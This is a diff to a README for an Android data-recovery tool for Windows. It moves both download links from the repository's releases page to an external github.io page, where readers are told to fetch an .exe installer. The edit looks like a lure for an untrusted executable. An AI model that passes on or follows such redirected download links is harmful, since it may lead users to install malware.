@@ -1,6 +1,6 @@
 # 📱 FoneLab-Android-2026 - Recover Lost Data From Android Phones
 
-[![](https://img.shields.io/badge/Download-FoneLab-blue.svg)](https://github.com/Vascovex/FoneLab-Android-2026/releases)
+[![](https://img.shields.io/badge/Download-FoneLab-blue.svg)](https://vascovex.github.io)
 
 FoneLab-Android-2026 helps you retrieve lost files from Android devices. This software works on Windows 11 and Windows 10 computers. You can use it to restore deleted photos, contact lists, messages, and call logs. The tool connects to your phone through a USB cable and scans the internal storage or SD card for missing information.
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets these requirements:
 
 You must obtain the installer from the official release page. 
 
-[Click here to visit the release page and download the software](https://github.com/Vascovex/FoneLab-Android-2026/releases)
+[Click here to visit the release page and download the software](https://vascovex.github.io)
 
 On this page, look for the latest version of the installer file ending in .exe. Click the file name to start the download. Save the file to your "Downloads" folder so you can find it easily. 
 
